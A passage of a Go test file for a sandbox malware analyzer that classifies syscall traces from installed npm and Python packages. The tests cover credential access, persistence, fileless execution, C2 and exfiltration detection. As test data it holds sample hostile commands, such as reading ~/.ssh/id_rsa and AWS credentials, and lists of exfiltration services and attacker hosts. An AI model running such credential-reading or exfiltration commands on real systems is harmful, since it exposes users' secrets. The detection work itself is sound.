		want   string
	}{
		{"discord.com", "Discord"},
		{"cdn.discordapp.com", "Discord"},
		{"api.telegram.org", "Telegram"},
		{"pastebin.com", "Pastebin"},
		{"webhook.site", "Webhook.site"},
		{"ipinfo.io", "ipinfo.io"},
		{"pypi.org", ""},    // not exfil
		{"google.com", ""},  // not exfil
		{"example.com", ""}, // not exfil
	}
	for _, tc := range tests {
		got := matchExfilService(tc.domain)
		if got != tc.want {
			t.Errorf("matchExfilService(%q) = %q, want %q", tc.domain, got, tc.want)
		}
	}
}

func TestCollectExecutedPaths(t *testing.T) {
	events := []types.SyscallEvent{
		{Syscall: types.EventExecve, Comm: "/tmp/.payload", Cmdline: "/tmp/.payload"},
		{Syscall: types.EventExecve, Comm: "/usr/bin/python3", Cmdline: "python3 /tmp/dropper.py"},
		{Syscall: types.EventOpenat, FilePath: "/home/dev/.ssh/id_rsa"},
	}
	paths := collectExecutedPaths(events)

	if !paths["/tmp/.payload"] {
		t.Error("expected /tmp/.payload in executed paths")
	}
	if !paths["/tmp/dropper.py"] {
		t.Error("expected /tmp/dropper.py in executed paths (from cmdline)")
	}
	if paths["/home/dev/.ssh/id_rsa"] {
		t.Error("/home/dev/.ssh/id_rsa should NOT be in executed paths")
	}
}

func TestClassify_HomeDirWrite(t *testing.T) {
	events := []types.SyscallEvent{
		{Syscall: types.EventOpenat, FilePath: "/home/dev/.config/systemd/user/evil.service", OpenFlags: "O_WRONLY|O_CREAT"},
	}
	_, filtered := Analyze(events)
	if len(filtered) != 1 {
		t.Fatalf("expected 1 event, got %d", len(filtered))
	}
	if filtered[0].Category != types.CategoryPersistence {
		t.Errorf("category = %q, want %q", filtered[0].Category, types.CategoryPersistence)
	}
	if !strings.Contains(filtered[0].Reason, "home directory") {
		t.Errorf("reason should mention home directory, got %q", filtered[0].Reason)
	}
}

func TestClassify_MemoryExecution(t *testing.T) {
	events := []types.SyscallEvent{
		{Syscall: types.EventMmap, MemProt: "PROT_READ|PROT_WRITE|PROT_EXEC", MemFlags: "MAP_PRIVATE|MAP_ANONYMOUS"},
		{Syscall: types.EventMprotect, MemProt: "PROT_READ|PROT_WRITE|PROT_EXEC"},
	}
	_, filtered := Analyze(events)
	if len(filtered) != 2 {
		t.Fatalf("expected 2 events, got %d", len(filtered))
	}
	for i, evt := range filtered {
		if evt.Category != types.CategoryMemExec {
			t.Errorf("event %d: category = %q, want %q", i, evt.Category, types.CategoryMemExec)
		}
	}
}

func TestClassify_AntiForensics(t *testing.T) {
	// create→execute→delete should be classified as anti_forensics
	events := []types.SyscallEvent{
		{Syscall: types.EventExecve, Comm: "/tmp/.payload", Cmdline: "/tmp/.payload"},
		{Syscall: types.EventUnlink, FilePath: "/tmp/.payload"},
	}
	_, filtered := Analyze(events)

	var hasAntiForensics bool
	for _, evt := range filtered {
		if evt.Category == types.CategoryAntiForensics {
			hasAntiForensics = true
		}
	}
	if !hasAntiForensics {
		t.Error("expected anti_forensics category for create→execute→delete pattern")
	}
}

func TestClassify_AntiForensics_NoExec(t *testing.T) {
	// delete without execute → NOT anti_forensics (filtered by analyzer)
	events := []types.SyscallEvent{
		{Syscall: types.EventUnlink, FilePath: "/tmp/tempfile"},
	}
	_, filtered := Analyze(events)

	for _, evt := range filtered {
		if evt.Category == types.CategoryAntiForensics {
			t.Error("unlink without matching execve should NOT be anti_forensics")
		}
	}
}

func TestClassify_OpenatWriteBashrc(t *testing.T) {
	events := []types.SyscallEvent{
		{Syscall: types.EventOpenat, FilePath: "/home/dev/.bashrc", OpenFlags: "O_WRONLY"},
	}
	_, filtered := Analyze(events)
	if len(filtered) != 1 {
		t.Fatalf("expected 1 event, got %d", len(filtered))
	}
	if filtered[0].Category != types.CategoryPersistence {
		t.Errorf("category = %q, want %q", filtered[0].Category, types.CategoryPersistence)
	}
}

func TestClassify_OpenatWriteZshrc(t *testing.T) {
	events := []types.SyscallEvent{
		{Syscall: types.EventOpenat, FilePath: "/home/dev/.zshrc", OpenFlags: "O_RDWR"},
	}
	_, filtered := Analyze(events)
	if len(filtered) != 1 {
		t.Fatalf("expected 1 event, got %d", len(filtered))
	}
	if filtered[0].Category != types.CategoryPersistence {
		t.Errorf("category = %q, want %q", filtered[0].Category, types.CategoryPersistence)
	}
}

func TestGenerateSummary_Persistence(t *testing.T) {
	events := []types.SyscallEvent{
		{Syscall: types.EventOpenat, Category: types.CategoryPersistence},
	}
	s := GenerateSummary(types.VerdictSuspicious, events)
	if s.RiskLevel != riskHigh {
		t.Errorf("risk_level = %q, want %q", s.RiskLevel, riskHigh)
	}
	if !strings.Contains(s.Remediation, ".bashrc") {
		t.Errorf("remediation should mention .bashrc, got %q", s.Remediation)
	}
}

// ---------------------------------------------------------------------------
// DoH detection
// ---------------------------------------------------------------------------

func TestClassify_DoH_Cloudflare(t *testing.T) {
	events := []types.SyscallEvent{
		{Syscall: types.EventConnect, DstAddr: "1.1.1.1", DstPort: 443, Family: 2},
	}
	_, filtered := Analyze(events)
	if len(filtered) != 1 {
		t.Fatalf("expected 1 event, got %d", len(filtered))
	}
	if filtered[0].Category != types.CategoryDNSTunnel {
		t.Errorf("category = %q, want %q", filtered[0].Category, types.CategoryDNSTunnel)
	}
	if !strings.Contains(filtered[0].Reason, "DNS-over-HTTPS") {
		t.Errorf("reason should mention DNS-over-HTTPS, got %q", filtered[0].Reason)
	}
}

func TestClassify_DoH_Google(t *testing.T) {
	events := []types.SyscallEvent{
		{Syscall: types.EventConnect, DstAddr: "8.8.8.8", DstPort: 443, Family: 2},
	}
	_, filtered := Analyze(events)
	if len(filtered) != 1 {
		t.Fatalf("expected 1 event, got %d", len(filtered))
	}
	if filtered[0].Category != types.CategoryDNSTunnel {
		t.Errorf("category = %q, want %q", filtered[0].Category, types.CategoryDNSTunnel)
	}
}

func TestClassify_DoH_NotPort443(t *testing.T) {
	// DoH server on port 53 = regular DNS, not DoH. Recorded as LOW
	// (dns_lookup) — the follow-up connect to the resolved IP is
	// what fires C2. See TestAnalyze_DnsLookupAloneStaysClean.
	events := []types.SyscallEvent{
		{Syscall: types.EventConnect, DstAddr: "1.1.1.1", DstPort: 53, Family: 2},
	}
	verdict, filtered := Analyze(events)
	if verdict != types.VerdictClean {
		t.Errorf("expected clean for isolated :53 connect, got %s", verdict)
	}
	if len(filtered) != 1 {
		t.Fatalf("expected 1 event, got %d", len(filtered))
	}
	if filtered[0].Category != types.CategoryDNSLookup {
		t.Errorf("category = %q, want %q", filtered[0].Category, types.CategoryDNSLookup)
	}
}

// TestAnalyze_DnsLookupAloneStaysClean documents the DNS-lookup
// demotion. An isolated connect(:53) or benign DNS query has no
// harm on its own — the sandbox runs --network=none so resolution
// never completes anyway. The real C2 signal is the follow-up
// connect() to the resolved IP, which fires CategoryC2 at HIGH
// independently. Recording the lookup at LOW keeps the forensic
// chain visible without flipping the verdict on every getaddrinfo
// probe that defensive code (npm registry ping, glibc NSS) fires.
func TestAnalyze_DnsLookupAloneStaysClean(t *testing.T) {
	cases := []struct {
		name   string
		events []types.SyscallEvent
	}{
		{
			name: "connect to external DNS resolver on :53",
			events: []types.SyscallEvent{
				{Syscall: types.EventConnect, DstAddr: "1.1.1.1", DstPort: 53, Family: 2},
			},
		},
		{
			name: "benign DNS query to external resolver",
			events: []types.SyscallEvent{
				{Syscall: types.EventSendto, DstAddr: "8.8.8.8", DstPort: 53, Family: 2,
					DNSQuery: "registry.npmjs.org"},
			},
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			verdict, filtered := Analyze(tc.events)
			if verdict != types.VerdictClean {
				t.Errorf("expected clean for isolated DNS lookup, got %s", verdict)
			}
			if len(filtered) != 1 {
				t.Fatalf("expected 1 forensic event, got %d", len(filtered))
			}
			if filtered[0].Category != types.CategoryDNSLookup {
				t.Errorf("category = %q, want %q", filtered[0].Category, types.CategoryDNSLookup)
			}
		})
	}
}

// TestAnalyze_DnsLookupThenConnect_C2Wins documents that a DNS
// lookup followed by a real outbound connect fires HIGH on the
// connect. Two events: one DNSLookup LOW + one C2 HIGH. Verdict
// is SUSPICIOUS from the connect alone.
func TestAnalyze_DnsLookupThenConnect_C2Wins(t *testing.T) {
	events := []types.SyscallEvent{
		{Syscall: types.EventSendto, DstAddr: "8.8.8.8", DstPort: 53, Family: 2,
			DNSQuery: "attacker.example.com"},
		{Syscall: types.EventConnect, DstAddr: "203.0.113.7", DstPort: 443, Family: 2},
	}
	verdict, filtered := Analyze(events)
	if verdict != types.VerdictSuspicious {
		t.Errorf("expected suspicious when TCP connect follows DNS, got %s", verdict)
	}
	var sawC2, sawLookup bool
	for _, e := range filtered {
		switch e.Category {
		case types.CategoryC2:
			sawC2 = true
		case types.CategoryDNSLookup:
			sawLookup = true
		}
	}
	if !sawC2 {
		t.Errorf("expected C2 event on the resolved-IP connect, got %v", filtered)
	}
	if !sawLookup {
		t.Errorf("expected DNSLookup event on the DNS query for forensic chain, got %v", filtered)
	}
}

func TestIsKnownDoHServer(t *testing.T) {
	known := []string{"1.1.1.1", "8.8.8.8", "9.9.9.9", "208.67.222.222"}
	for _, ip := range known {
		if !isKnownDoHServer(ip) {
			t.Errorf("expected %s to be known DoH server", ip)
		}
	}
	if isKnownDoHServer("203.0.113.50") {
		t.Error("random IP should not be DoH server")
	}
}

// ---------------------------------------------------------------------------
// /dev/shm execution detection
// ---------------------------------------------------------------------------

func TestAnalyze_DevShmExecution(t *testing.T) {
	events := []types.SyscallEvent{
		{Syscall: types.EventExecve, Comm: "/dev/shm/payload", Cmdline: "/dev/shm/payload --exfil"},
	}
	verdict, filtered := Analyze(events)
	if verdict != types.VerdictSuspicious {
		t.Errorf("expected suspicious for /dev/shm exec, got %s", verdict)
	}
	if len(filtered) != 1 {
		t.Fatalf("expected 1 event, got %d", len(filtered))
	}
	if !strings.Contains(filtered[0].Reason, "fileless") {
		t.Errorf("reason should mention fileless, got %q", filtered[0].Reason)
	}
}

func TestAnalyze_ProcSelfFdExecution(t *testing.T) {
	events := []types.SyscallEvent{
		{Syscall: types.EventExecve, Comm: "/proc/self/fd/3", Cmdline: "/proc/self/fd/3"},
	}
	verdict, filtered := Analyze(events)
	if verdict != types.VerdictSuspicious {
		t.Errorf("expected suspicious for /proc/self/fd exec, got %s", verdict)
	}
	if len(filtered) != 1 {
		t.Fatalf("expected 1 event, got %d", len(filtered))
	}
}

func TestAnalyze_DevShmBenignBinaryName(t *testing.T) {
	// Even if the binary is named "python3", /dev/shm is never allowed.
	events := []types.SyscallEvent{
		{Syscall: types.EventExecve, Comm: "/dev/shm/python3", Cmdline: "python3 setup.py"},
	}
	verdict, _ := Analyze(events)
	if verdict != types.VerdictSuspicious {
		t.Errorf("expected suspicious for /dev/shm/python3, got %s", verdict)
	}
}

func TestSetSensitivePaths(t *testing.T) {
	orig := sensitivePathPatterns
	defer func() { sensitivePathPatterns = orig }()

	SetSensitivePaths([]string{"/.custom-secret/"})
	if len(sensitivePathPatterns) != 1 || sensitivePathPatterns[0] != "/.custom-secret/" {
		t.Errorf("SetSensitivePaths did not update patterns: %v", sensitivePathPatterns)
	}
}

func TestArgsTouchSensitivePath(t *testing.T) {
	orig := sensitivePathPatterns
	defer func() { sensitivePathPatterns = orig }()
	SetSensitivePaths([]string{"/.ssh/", "/.aws/"})

	cases := []struct {
		name    string
		segment string
		want    bool
	}{
		{"cat ssh key", "cat /home/dev/.ssh/id_rsa", true},
		{"grep aws creds", "grep -r . /home/dev/.aws/credentials", true},
		{"head git creds", "head /home/dev/.aws/config", true},
		{"benign cat", "cat /etc/hosts", false},
		{"flag only", "ls -la", false},
		{"no args", "ls", false},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := argsTouchSensitivePath(tc.segment)
			if got != tc.want {
				t.Errorf("argsTouchSensitivePath(%q) = %v, want %v", tc.segment, got, tc.want)
			}
		})
	}
}

// TestAnalyze_ShellCmdSensitivePath documents that `sh -c cat ~/.ssh/...`
// is caught by the credential_access rule on the actual openat, not by
// inspecting the shell cmdline. Without the harm syscall the shell
// event records as CategoryUnknownBinary (LOW) for forensics.
// Superseded by TestAnalyze_ShellCMultiLayer's "reads ssh key" case;
// kept here as a focused regression against the demotion choice.
func TestAnalyze_ShellCmdSensitivePath(t *testing.T) {
	orig := sensitivePathPatterns
	defer func() { sensitivePathPatterns = orig }()
	SetSensitivePaths([]string{"/.ssh/", "/.aws/"})

	events := []types.SyscallEvent{
		{Syscall: types.EventExecve, Comm: "/bin/sh", Cmdline: "sh -c cat /home/dev/.ssh/id_rsa"},
		{Syscall: types.EventOpenat, FilePath: "/home/dev/.ssh/id_rsa", OpenFlags: "O_RDONLY"},
	}
	verdict, filtered := Analyze(events)
	if verdict != types.VerdictSuspicious {
		t.Errorf("expected suspicious for shell cmd accessing .ssh, got %s", verdict)
	}
	var sawCred bool
	for _, e := range filtered {
		if e.Category == types.CategoryCredentialAccess {
			sawCred = true
			break
		}
	}
	if !sawCred {
		t.Errorf("expected credential_access from the openat, got %v", filtered)
	}
}

// TestAnalyze_V8JITFilter documents the PID-based filter for V8 JIT
// pages: simultaneous RWX mprotect/mmap from a Node interpreter is
// legitimate code generation, not shellcode injection. The filter
// requires (a) the same PID appears as the target of a prior execve,
// (b) that execve's basename is a known JIT interpreter, and (c) the
// execve came from a trusted system directory — an attacker cannot
// bypass by planting a binary named "node" under /install/.
func TestAnalyze_V8JITFilter(t *testing.T) {
	// Node JIT pattern from /usr/bin/node. Must NOT flip the verdict.
	nodePID := uint32(1234)
	jitFromNode := []types.SyscallEvent{
		{Syscall: types.EventExecve, Comm: "/usr/bin/node", Cmdline: "node /install/node_modules/lodash/index.js", PID: nodePID},
		{Syscall: types.EventMprotect, MemProt: "PROT_READ|PROT_WRITE|PROT_EXEC", PID: nodePID},
		{Syscall: types.EventMmap, MemProt: "PROT_READ|PROT_WRITE|PROT_EXEC", MemFlags: "MAP_PRIVATE|MAP_ANONYMOUS", PID: nodePID},
	}
	verdict, _ := Analyze(jitFromNode)
	if verdict != types.VerdictClean {
		t.Errorf("expected clean when RWX comes from /usr/bin/node, got %s", verdict)
	}

	// npm symlink (Linux binfmt_script transparently re-execs node;
	// strace only sees the npm execve). The filter must treat npm
	// from a trusted directory as JIT-equivalent.
	npmPID := uint32(2345)
	jitFromNpm := []types.SyscallEvent{
		{Syscall: types.EventExecve, Comm: "/usr/local/bin/npm", Cmdline: "npm run --silent --if-present preinstall", PID: npmPID},
		{Syscall: types.EventMprotect, MemProt: "PROT_READ|PROT_WRITE|PROT_EXEC", PID: npmPID},
	}
	verdict, _ = Analyze(jitFromNpm)
	if verdict != types.VerdictClean {
		t.Errorf("expected clean when RWX comes from /usr/local/bin/npm (V8 JIT via shebang), got %s", verdict)
	}

	// Shellcode injection pattern: RWX from a PID whose execve was NOT
	// a JIT interpreter. Must STILL trip memory_execution.
	payloadPID := uint32(5678)
	shellcodeFromPayload := []types.SyscallEvent{
		{Syscall: types.EventExecve, Comm: "/install/node_modules/evil/payload", Cmdline: "payload", PID: payloadPID},
		{Syscall: types.EventMprotect, MemProt: "PROT_READ|PROT_WRITE|PROT_EXEC", PID: payloadPID},
	}
	verdict, filtered := Analyze(shellcodeFromPayload)
	if verdict != types.VerdictSuspicious {
		t.Errorf("expected suspicious when RWX from non-JIT PID, got %s", verdict)
	}
	var sawMemExec bool
	for _, e := range filtered {
		if e.Category == types.CategoryMemExec {
			sawMemExec = true
			break
		}
	}
	if !sawMemExec {
		t.Errorf("expected memory_execution event in %v", filtered)
	}

	// Bypass attempt: attacker plants a binary named "npm" or "node"
	// under /install/ and exec's it. The basename matches
	// jitInterpreters, but the directory is NOT in
	// jitInterpreterTrustedDirs, so the filter MUST NOT suppress
	// these events. Tests the path-constraint half of the filter.
	for _, fakePath := range []string{
		"/install/node_modules/evil/bin/npm",
		"/install/node_modules/evil/bin/node",
		"/tmp/node",
	} {
		bypassPID := uint32(9000)
		bypassAttempt := []types.SyscallEvent{
			{Syscall: types.EventExecve, Comm: fakePath, Cmdline: "fake-node", PID: bypassPID},
			{Syscall: types.EventMprotect, MemProt: "PROT_READ|PROT_WRITE|PROT_EXEC", PID: bypassPID},
		}
		verdict, _ = Analyze(bypassAttempt)
		if verdict != types.VerdictSuspicious {
			t.Errorf("filter bypassed by %q — RWX from attacker-controlled path must NOT be filtered, got %s", fakePath, verdict)
		}
	}

	// PID=0 (main strace target, parser miss) does NOT get the JIT
	// pass — the existing shellcode detection still fires. This
	// preserves the original behavior for events the parser failed
	// to attribute.
	rwxNoPID := []types.SyscallEvent{
		{Syscall: types.EventMprotect, MemProt: "PROT_READ|PROT_WRITE|PROT_EXEC", PID: 0},
	}
	verdict, _ = Analyze(rwxNoPID)
	if verdict != types.VerdictSuspicious {
		t.Errorf("expected suspicious for unattributed RWX (PID=0), got %s", verdict)
	}

	// V8 worker thread pattern: node clones a thread that never
	// execve's, then the thread does RWX mprotect for JIT pages.
	// The clone event propagates the parent's comm to the child PID
	// so the filter recognizes it. Without clone propagation, every
	// real npm scan flips suspicious because V8 worker mprotect events
	// leak past the filter.
	parentNodePID := uint32(220)
	workerPID := uint32(633)
	jitFromWorkerThread := []types.SyscallEvent{
		{Syscall: types.EventExecve, Comm: "/usr/bin/node", PID: parentNodePID},
		{Syscall: types.EventClone, PID: parentNodePID, ChildPID: workerPID},
		{Syscall: types.EventMprotect, MemProt: "PROT_READ|PROT_WRITE|PROT_EXEC", PID: workerPID},
	}
	verdict, _ = Analyze(jitFromWorkerThread)
	if verdict != types.VerdictClean {
		t.Errorf("expected clean when V8 worker thread (cloned from node) does RWX, got %s", verdict)
	}

	// Clone chain in temporal order: node → helper → grandchild → mprotect.
	// Streaming pass resolves the grandchild's comm from helper's comm
	// from node's comm. Mirrors strace's natural emission order.
	helperPID := uint32(800)
	grandchildPID := uint32(801)
	jitFromGrandchild := []types.SyscallEvent{
		{Syscall: types.EventExecve, Comm: "/usr/bin/node", PID: parentNodePID},
		{Syscall: types.EventClone, PID: parentNodePID, ChildPID: helperPID},
		{Syscall: types.EventClone, PID: helperPID, ChildPID: grandchildPID},
		{Syscall: types.EventMprotect, MemProt: "PROT_READ|PROT_WRITE|PROT_EXEC", PID: grandchildPID},
	}
	verdict, _ = Analyze(jitFromGrandchild)
	if verdict != types.VerdictClean {
		t.Errorf("expected clean for clone-chain JIT (grandchild of node), got %s", verdict)
	}

	// PID = 0 main strace target: when strace runs `node` directly
	// as its target (as in the import phase), node's syscalls have
	// no `[pid X]` prefix and extract as PID = 0. Worker-thread
	// clones from PID = 0 must propagate the main target's comm to
	// the child. This is the case the original V8 filter missed and
	// the reason every clean npm scan stayed suspicious before this
	// streaming pre-pass.
	workerFromMain := uint32(638)
	jitFromMainTarget := []types.SyscallEvent{
		{Syscall: types.EventExecve, Comm: "/usr/bin/node", PID: 0}, // strace target, no [pid X] prefix
		{Syscall: types.EventClone, PID: 0, ChildPID: workerFromMain},
		{Syscall: types.EventMprotect, MemProt: "PROT_READ|PROT_WRITE|PROT_EXEC", PID: workerFromMain},
	}
	verdict, _ = Analyze(jitFromMainTarget)
	if verdict != types.VerdictClean {
		t.Errorf("expected clean for V8 worker cloned from PID=0 main target, got %s", verdict)
	}

	// Main-target disambiguation: strace prints the main target's
	// syscalls WITHOUT [pid X] prefix until ambiguity forces a
	// switch. From that point the SAME process appears as [pid X]
	// where X is its real kernel PID. This test simulates argon2's
	// import phase where node's execve appears at PID=0 but later
	// node thread-clones appear under PID=634 (node's real PID).
	// Without main-target aliasing, clones from PID=634 cannot find
	// a parent in m and worker mprotect events leak past the JIT
	// filter. The aliasing pass propagates m[0] to m[634] when 634
	// first emits a non-clone event.
	nodeRealPID := uint32(634)
	workerPID2 := uint32(636)
	disambiguatedMainTarget := []types.SyscallEvent{
		{Syscall: types.EventExecve, Comm: "/usr/bin/node", PID: 0},
		{Syscall: types.EventMmap, MemProt: "PROT_NONE", PID: nodeRealPID}, // first event under disambiguated PID
		{Syscall: types.EventClone, PID: nodeRealPID, ChildPID: workerPID2},
		{Syscall: types.EventMprotect, MemProt: "PROT_READ|PROT_WRITE|PROT_EXEC", PID: workerPID2},
	}
	verdict, _ = Analyze(disambiguatedMainTarget)
	if verdict != types.VerdictClean {
		t.Errorf("expected clean for worker cloned from disambiguated main-target PID, got %s", verdict)
	}

	// A child that does its own execve overrides any clone-inherited
	// comm. If sh forks a child and the child execs a malicious
	// binary, the child's mprotect RWX must NOT be filtered as JIT.
	maliciousPID := uint32(900)
	childExecveWins := []types.SyscallEvent{
		{Syscall: types.EventExecve, Comm: "/usr/bin/node", PID: parentNodePID},
		{Syscall: types.EventClone, PID: parentNodePID, ChildPID: maliciousPID},
		{Syscall: types.EventExecve, Comm: "/install/payload", PID: maliciousPID},
		{Syscall: types.EventMprotect, MemProt: "PROT_READ|PROT_WRITE|PROT_EXEC", PID: maliciousPID},
	}
	verdict, _ = Analyze(childExecveWins)
	if verdict != types.VerdictSuspicious {
		t.Errorf("clone-then-execve must keep execve attribution, got %s — payload exec'd from clone'd child must still fire shellcode rule", verdict)
	}
}

// Unrecognized binary execve (find, dirname, arbitrary tools) that
// reaches the default branch of classifyExecve is recorded at LOW
// severity (CategoryUnknownBinary) and must not flip the verdict on
// its own. This documents the L570 default-branch demotion decided in
// the classifyExecve rationale.
func TestAnalyze_UnknownBinaryStaysClean(t *testing.T) {
	events := []types.SyscallEvent{
		{
			Syscall: types.EventExecve,
			Comm:    "/usr/bin/find",
			Cmdline: "find /install/node_modules -name package.json",
		},
	}
	verdict, filtered := Analyze(events)
	if verdict != types.VerdictClean {
		t.Errorf("expected clean for unknown binary (LOW-only events), got %s", verdict)
	}
	if len(filtered) != 1 {
		t.Fatalf("expected 1 event recorded for forensic visibility, got %d", len(filtered))
	}
	if filtered[0].Category != types.CategoryUnknownBinary {
		t.Errorf("expected category %q, got %q", types.CategoryUnknownBinary, filtered[0].Category)
	}
}

func TestAnalyze_PtraceTraceme(t *testing.T) {
	// evasion is a MEDIUM-severity signal; two ptrace events together
	// is the threshold for SUSPICIOUS (single ptrace can occur in
	// legitimate debugger-aware code paths).
	events := []types.SyscallEvent{
		{Syscall: types.EventPtrace, Comm: "ptrace(PTRACE_TRACEME)"},
		{Syscall: types.EventPtrace, Comm: "ptrace(PTRACE_TRACEME)"},
	}
	verdict, filtered := Analyze(events)
	if verdict != types.VerdictSuspicious {
		t.Errorf("expected suspicious for ptrace, got %s", verdict)
	}
	if len(filtered) != 2 {
		t.Fatalf("expected 2 events, got %d", len(filtered))
	}
	if filtered[0].Category != types.CategoryEvasion {
		t.Errorf("expected category %q, got %q", types.CategoryEvasion, filtered[0].Category)
	}
}

func TestGenerateSummary_Evasion(t *testing.T) {
	events := []types.SyscallEvent{
		{Syscall: types.EventPtrace, Category: types.CategoryEvasion},
	}
	summary := GenerateSummary(types.VerdictSuspicious, events)
	if summary.RiskLevel != riskHigh {
		t.Errorf("expected risk %q for evasion, got %q", riskHigh, summary.RiskLevel)
	}
	if !strings.Contains(summary.Description, "anti-debugging") {
		t.Errorf("expected description to mention anti-debugging, got %q", summary.Description)
	}
}

func TestIsSystemBinaryTarget(t *testing.T) {
	tests := []struct {
		path string
		want bool
	}{
		{"/usr/local/bin/python3", true},
		{"/usr/local/bin/node", true},
		{"/usr/bin/sh", true},
		{"/usr/local/bin/pip", true},
		{"/bin/bash", true},
		{"/sbin/env", true},
		{"/usr/local/bin/black", false},
		{"/usr/local/bin/pytest", false},
		{"/tmp/python3", false},
		{"/home/dev/node", false},
	}
	for _, tt := range tests {
		got := isSystemBinaryTarget(tt.path)
		if got != tt.want {
			t.Errorf("isSystemBinaryTarget(%q) = %v, want %v", tt.path, got, tt.want)
		}
	}
}

func TestClassify_OpenatSystemBinaryWrite(t *testing.T) {
	evt := types.SyscallEvent{
		Syscall:   types.EventOpenat,
		FilePath:  "/usr/local/bin/python3",
		OpenFlags: "O_WRONLY|O_CREAT|O_TRUNC",
	}
	classify(&evt)
	if evt.Category != types.CategoryBinaryHijack {
		t.Errorf("category = %q, want %q", evt.Category, types.CategoryBinaryHijack)
	}
	if !strings.Contains(evt.Reason, "trusted system binary") {
		t.Errorf("reason should mention trusted system binary, got %q", evt.Reason)
	}
}

func TestClassify_OpenatSystemBinaryReadNotHijack(t *testing.T) {
	evt := types.SyscallEvent{
		Syscall:   types.EventOpenat,
		FilePath:  "/usr/local/bin/python3",
		OpenFlags: "O_RDONLY|O_CLOEXEC",
	}
	classify(&evt)
	// Read should NOT be classified as binary hijack.
	if evt.Category == types.CategoryBinaryHijack {
		t.Error("read from system binary should not be binary_hijacking")
	}
}

func TestClassify_DynamicExec(t *testing.T) {
	evt := types.SyscallEvent{
		Syscall:     types.EventDynamicExec,
		AuditEvent:  "eval",
		CodeSnippet: "process.env.GITHUB_TOKEN",
	}
	classify(&evt)
	if evt.Category != types.CategoryDynamicExec {
		t.Errorf("category = %q, want %q", evt.Category, types.CategoryDynamicExec)
	}
	if !strings.Contains(evt.Reason, "audit hook") {
		t.Errorf("reason should mention audit hook, got %q", evt.Reason)
	}
}

func TestExtractNpmInstalledPkg(t *testing.T) {
	cases := []struct {
		path string
		want string
	}{
		// Regular package.
		{"/install/node_modules/lodash/index.js", "lodash"},
		{"/install/node_modules/lodash/lib/sub/file.js", "lodash"},
		{"/install/node_modules/lodash", "lodash"},
		// Scoped package — the "@scope/name" identifier is returned
		// intact so callers can match against scan-target names that
		// retain the scope.
		{"/install/node_modules/@babel/core/lib/index.js", "@babel/core"},
		{"/install/node_modules/@babel/core", "@babel/core"},
		// npm bookkeeping under `.`-prefixed entries — never an
		// attacker-installed package; return empty so the caller
		// neither treats it as self nor as a hijack target.
		{"/install/node_modules/.package-lock.json", ""},
		{"/install/node_modules/.bin/foo", ""},
		{"/install/node_modules/.cache/registry/lodash-4.17.21.tgz", ""},
		// Malformed / non-matching inputs.
		{"/install/node_modules/", ""},
		{"/install/node_modules", ""},
		{"/install/foo/bar", ""},
		{"/home/dev/.npm/_logs/x.log", ""},
		{"", ""},
		// Scoped package without name segment is not a valid package
		// directory — treat as no-match rather than misclassify.
		{"/install/node_modules/@scope", ""},
		{"/install/node_modules/@scope/", ""},
	}
	for _, tc := range cases {
		t.Run(tc.path, func(t *testing.T) {
			got := extractNpmInstalledPkg(tc.path)
			if got != tc.want {
				t.Errorf("extractNpmInstalledPkg(%q) = %q, want %q", tc.path, got, tc.want)
			}
		})
	}
}

// TestAnalyze_LibraryHijackCrossWrite documents the cross-package write
// detection: a scanned package writes into a sibling installed
// package's source tree. Harm fires when a later workflow imports the
// hijacked package, outside kojuto's scan window — placement is the
// only opportunity to detect it.
func TestAnalyze_LibraryHijackCrossWrite(t *testing.T) {
	orig := scannedPkgs
	defer func() { scannedPkgs = orig }()
	SetScanPkgs([]string{"argon2"})

	events := []types.SyscallEvent{
		{
			Syscall:   types.EventOpenat,
			FilePath:  "/install/node_modules/lodash/index.js",
			OpenFlags: "O_WRONLY|O_TRUNC",
		},
	}
	verdict, filtered := Analyze(events)
	if verdict != types.VerdictSuspicious {
		t.Errorf("expected suspicious for cross-package write, got %s", verdict)
	}
	if len(filtered) != 1 || filtered[0].Category != types.CategoryLibraryHijack {
		t.Errorf("expected single library_hijacking event, got %+v", filtered)
	}
}

// TestAnalyze_LibraryHijackSelfWrite documents that writes to the
// scanned package's OWN directory are not library hijacks. Native-
// module packages legitimately write build output (e.g. `.node`
// binaries) into their own /install/node_modules/<self>/build/.
func TestAnalyze_LibraryHijackSelfWrite(t *testing.T) {
	orig := scannedPkgs
	defer func() { scannedPkgs = orig }()
	SetScanPkgs([]string{"argon2"})

	events := []types.SyscallEvent{
		{
			Syscall:   types.EventOpenat,
			FilePath:  "/install/node_modules/argon2/build/Release/argon2.node",
			OpenFlags: "O_WRONLY|O_CREAT",
		},
	}
	verdict, filtered := Analyze(events)
	if verdict != types.VerdictClean {
		t.Errorf("expected clean for self-write to own build output, got %s", verdict)
	}
	for _, e := range filtered {
		if e.Category == types.CategoryLibraryHijack {
			t.Errorf("self-write must not be library_hijacking, got %+v", e)
		}
	}
}

// TestAnalyze_LibraryHijackScoped documents that scoped packages
// (@scope/name) are matched against the scan target list using their
// full @scope/name identifier — that is how npm/yarn store them and
// how dep-file declarations write them.
func TestAnalyze_LibraryHijackScoped(t *testing.T) {
	orig := scannedPkgs
	defer func() { scannedPkgs = orig }()
	SetScanPkgs([]string{"@babel/core"})

	selfWrite := []types.SyscallEvent{
		{
			Syscall:   types.EventOpenat,
			FilePath:  "/install/node_modules/@babel/core/lib/generated.js",
			OpenFlags: "O_WRONLY|O_CREAT",
		},
	}
	verdict, filtered := Analyze(selfWrite)
	if verdict != types.VerdictClean {
		t.Errorf("expected clean for scoped self-write, got %s — events=%+v", verdict, filtered)
	}

	crossScopeWrite := []types.SyscallEvent{
		{
			Syscall:   types.EventOpenat,
			FilePath:  "/install/node_modules/@babel/traverse/lib/index.js",
			OpenFlags: "O_WRONLY|O_TRUNC",
		},
	}
	verdict, filtered = Analyze(crossScopeWrite)
	if verdict != types.VerdictSuspicious {
		t.Errorf("expected suspicious for cross-package scoped write, got %s", verdict)
	}
	if len(filtered) != 1 || filtered[0].Category != types.CategoryLibraryHijack {
		t.Errorf("expected single library_hijacking event, got %+v", filtered)
	}
}

// TestAnalyze_LibraryHijackNpmBookkeepingIgnored documents that npm's
// own bookkeeping entries (`.package-lock.json`, `.bin/`, `.cache/`)
// do not fire the rule. They are npm internals, not attacker-installed
// packages.
func TestAnalyze_LibraryHijackNpmBookkeepingIgnored(t *testing.T) {
	orig := scannedPkgs
	defer func() { scannedPkgs = orig }()
	SetScanPkgs([]string{"argon2"})

	events := []types.SyscallEvent{
